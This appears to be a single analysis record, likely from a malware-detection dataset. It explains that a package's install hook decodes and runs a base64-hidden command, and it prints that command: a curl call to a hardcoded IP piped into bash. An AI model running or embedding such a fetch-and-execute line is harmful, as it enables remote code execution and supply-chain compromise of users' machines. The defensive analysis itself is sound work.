      "malicious_behavior": "The code contains malicious behavior. It uses base64 encoding to obfuscate a shell command that is executed automatically during the package installation process (in the AfterInstall class's run method). The decoded command is: 'curl  -s http://192.168.1.34:8000/test.txt | bash', which downloads a script from a hardcoded, attacker-controlled IP address and pipes it directly to bash for execution without user consent or interaction. This pattern of executing obfuscated shell commands during package installation is a hallmark of supply chain attacks and remote code execution malware. The use of base64 encoding to hide the command, the automatic execution during install, and the network retrieval and execution of remote code all strongly indicate malicious intent."
